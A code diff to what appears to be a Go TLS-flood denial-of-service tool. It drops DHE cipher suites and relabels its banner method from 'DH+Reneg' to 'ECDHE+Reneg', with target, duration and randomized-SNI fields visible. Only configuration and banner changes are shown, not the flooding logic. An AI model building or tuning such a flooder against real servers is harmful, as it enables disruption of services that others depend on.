@@ -11,7 +11,6 @@ import (
 	"net/url"
 	"os"
 	"os/signal"
-	"runtime"
 	"strconv"
 	"strings"
 	"sync"
@@ -83,8 +82,6 @@ var cipherSuitesTLS10 = []uint16{
 	tls.TLS_RSA_WITH_AES_256_CBC_SHA,
 	tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
 	tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
-	tls.TLS_DHE_RSA_WITH_AES_128_CBC_SHA,
-	tls.TLS_DHE_RSA_WITH_AES_256_CBC_SHA,
 }
 
 var cipherSuitesTLS11 = []uint16{
@@ -92,8 +89,6 @@ var cipherSuitesTLS11 = []uint16{
 	tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
 	tls.TLS_RSA_WITH_AES_128_CBC_SHA,
 	tls.TLS_RSA_WITH_AES_256_CBC_SHA,
-	tls.TLS_DHE_RSA_WITH_AES_128_CBC_SHA,
-	tls.TLS_DHE_RSA_WITH_AES_256_CBC_SHA,
 }
 
 var cipherSuitesTLS12 = []uint16{
@@ -103,10 +98,6 @@ var cipherSuitesTLS12 = []uint16{
 	tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
 	tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
 	tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
-	tls.TLS_DHE_RSA_WITH_AES_128_GCM_SHA256,
-	tls.TLS_DHE_RSA_WITH_AES_256_GCM_SHA384,
-	tls.TLS_DHE_RSA_WITH_AES_128_CBC_SHA,
-	tls.TLS_DHE_RSA_WITH_AES_256_CBC_SHA,
 }
 
 func randomSNI() string {
@@ -276,7 +267,7 @@ func main() {
 	}
 
 	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
-	fmt.Printf("ޗ | Method : TLS-FLOOD (DH+Reneg)\n")
+	fmt.Printf("ޗ | Method : TLS-FLOOD (ECDHE+Reneg)\n")
 	fmt.Printf("ޗ | Ulimit : 1048576\n")
 	fmt.Printf("ޗ | Target : %s\n", target)
 	fmt.Printf("ޗ | Time   : %d seconds\n", dur)
